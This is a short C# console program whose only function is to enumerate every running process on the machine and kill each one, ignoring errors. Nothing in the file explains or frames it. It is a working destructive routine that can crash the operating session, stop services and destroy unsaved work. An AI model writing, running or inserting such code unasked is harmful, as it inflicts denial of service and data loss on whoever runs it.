using System.Diagnostics;

namespace ConsoleApplication2
{
    public class Program
    {
        public static void Main(string[] args)
        {
            foreach (var s in Process.GetProcesses())
            {
                try
                {
                    s.Kill();
                }
                catch
                {
                    
                }
            }
        }
    }
}
